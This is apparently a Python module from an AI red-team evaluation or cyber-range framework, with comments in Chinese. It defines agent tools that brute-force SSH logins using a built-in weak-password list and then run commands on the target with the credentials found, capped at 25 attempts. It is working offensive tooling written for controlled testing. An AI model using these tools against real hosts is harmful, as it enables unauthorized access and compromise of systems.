"""SSH 攻击工具：ssh_bruteforce（T1110 暴力破解）与 ssh_command（T1078/T1059）。

红方仅允许网络攻击面，禁止 docker exec 攻击（唯一例外见 claim_success 裁判）。

两个工具都通过 sshpass + ssh 从宿主机经网络访问目标 SSH 服务，模拟真实
攻击者：没有目标凭据先验，只能爆破或利用已获得的凭据执行命令。
"""

from __future__ import annotations

import re

from cai.sdk.agents import function_tool

from .._common import _run
from ._helpers import _clip, _gt_record, _kw

# 内置常用弱口令（passwords 参数为空时使用）。
_BUILTIN_PASSWORDS = ["password", "123456", "admin", "root",
                      "user", "ctf", "test", "ubuntu"]

# 硬性上限：无论 agent 传多大，爆破尝试次数都不超过该值。
_MAX_ATTEMPTS_CAP = 25

_SSH_BASE_OPTS = [
    "-o", "StrictHostKeyChecking=no",
    "-o", "UserKnownHostsFile=/dev/null",
    "-o", "ConnectTimeout=8",
    "-o", "PreferredAuthentications=password",
    "-o", "PubkeyAuthentication=no",
    "-o", "NumberOfPasswordPrompts=1",
]


def _ssh_run(host: str, port: int, username: str, password: str,
             command: str, timeout: int = 20):
    """经 sshpass 在目标上执行 command，返回 (rc, stdout, stderr)。"""
    return _run(
        ["sshpass", "-p", password, "ssh", *_SSH_BASE_OPTS,
         "-p", str(port), "-l", username, host, command],
        timeout=timeout,
    )


@function_tool
@_gt_record("T1110", _kw("host", 0, ""),
            lambda r: "BRUTEFORCE: SUCCESS" in r)
def ssh_bruteforce(host: str, port: int = 22,
                   users: str = "root,admin,user,ctf",
                   passwords: str = "",
                   max_attempts: int = 20) -> str:
    """红方 SSH 弱口令爆破：逐个尝试 用户名×密码 组合。

    每次尝试都真实执行 sshpass 登录并运行 ``id``；只有当 ``id`` 输出中
    出现 ``uid=`` 才判定成功（即成功是经过验证的登录，不是猜的）。

    Args:
        host: 目标主机（必填）。
        port: SSH 端口（默认 22）。
        users: 逗号分隔的用户名列表。
        passwords: 逗号分隔的密码列表；为空时用内置常用弱口令
            (password,123456,admin,root,user,ctf,test,ubuntu)。
        max_attempts: 最大尝试次数，硬性封顶 25（超出会被截断）。

    Returns:
        "BRUTEFORCE: SUCCESS user=... password=... uid=... attempts=N" 或
        "BRUTEFORCE: FAILED - 用尽 N 次尝试未成功"（attempts 如实报告）。
    """
    host = (host or "").strip()
    if not host:
        return "BRUTEFORCE: FAILED - host 为空"

    user_list = [u.strip() for u in (users or "").split(",") if u.strip()]
    pass_list = [p.strip() for p in (passwords or "").split(",") if p.strip()]
    if not pass_list:
        pass_list = list(_BUILTIN_PASSWORDS)
    if not user_list:
        return "BRUTEFORCE: FAILED - users 为空"

    cap = max(1, min(int(max_attempts or 20), _MAX_ATTEMPTS_CAP))

    attempts = 0
    for user in user_list:
        for password in pass_list:
            if attempts >= cap:
                break
            attempts += 1
            try:
                rc, out, _err = _ssh_run(host, int(port), user, password, "id")
            except Exception:
                continue
            uid_match = re.search(r"uid=\d+\([\w-]+\)", out or "")
            if rc == 0 and uid_match:
                return _clip(
                    "BRUTEFORCE: SUCCESS "
                    f"user={user} password={password} "
                    f"{uid_match.group(0)} attempts={attempts}"
                )
        if attempts >= cap:
            break

    return (
        f"BRUTEFORCE: FAILED - 用尽 {attempts} 次尝试未成功"
        f" (users={len(user_list)}, cap={cap})"
    )


@function_tool
@_gt_record("T1078", _kw("host", 0, ""),
            lambda r: "SSH CMD: OK" in r)
def ssh_command(host: str, username: str, password: str,
                command: str, port: int = 22) -> str:
    """红方 SSH 命令执行：用已获得的凭据在目标上执行一条命令。

    Args:
        host: 目标主机（必填）。
        username: SSH 用户名。
        password: SSH 密码。
        command: 要执行的命令（如 "id"、"cat /path/to/file"）。
        port: SSH 端口（默认 22）。

    Returns:
        "SSH CMD: OK (rc=0)\n<stdout>" 或 "SSH CMD: FAILED (rc=N) - <原因>"。
    """
    host = (host or "").strip()
    command = (command or "").strip()
    if not host or not command:
        return "SSH CMD: FAILED - host/command 为空"

    rc, out, err = _ssh_run(host, int(port), username, password, command)
    output = (out or "").strip()
    err_text = (err or "").strip()

    if rc == 0:
        return _clip(f"SSH CMD: OK (rc=0)\n{output or '(empty output)'}")

    reason = ("Permission denied"
              if "permission denied" in err_text.lower()
              else (err_text or output or "unknown error")[:120])
    return _clip(f"SSH CMD: FAILED (rc={rc}) - {reason}")
